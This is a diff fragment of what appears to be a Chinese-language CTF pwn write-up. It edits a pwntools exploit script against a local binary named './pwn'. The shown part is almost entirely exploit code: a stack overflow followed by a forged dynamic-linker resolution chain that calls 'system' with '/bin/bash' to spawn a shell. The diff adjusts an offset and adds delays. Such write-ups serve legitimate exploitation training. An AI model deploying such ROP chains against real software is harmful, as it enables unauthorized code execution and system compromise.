@@ -139,7 +139,7 @@ Contents of section .dynstr:
 我们来构造一下exp
 
 ```
-from pwn import*
+from pwn import *
 p = process('./pwn')
 context.log_level = 'debug'
 elf = ELF('./pwn')
@@ -150,14 +150,16 @@ payload +=  p32(elf.plt['read']) + p32(0x804852D)#fun_addr
 payload += p32(0) + p32(gift) + p32(17*4)
 
 p.sendline(payload)
+sleep(0.5)
 
 payload = ''
 payload += p32(0x0804a00c) + p32(0x1e707)
-payload += p32(0)+p32(0x1ee4)
+payload += p32(0)+p32(0x1de4)
 payload += p32(0) *4
 payload += 'system\x00\x00'
 payload += '/bin/bash\x00'
 p.sendline(payload)
+sleep(0.5)
 
 payload = 0x28*'a' + 4*'a'
 payload += p32(0x8048380) + p32(0x1d04) + p32(0xbeef) + p32(gift + 10*4)# system + rubbish + 'sh'
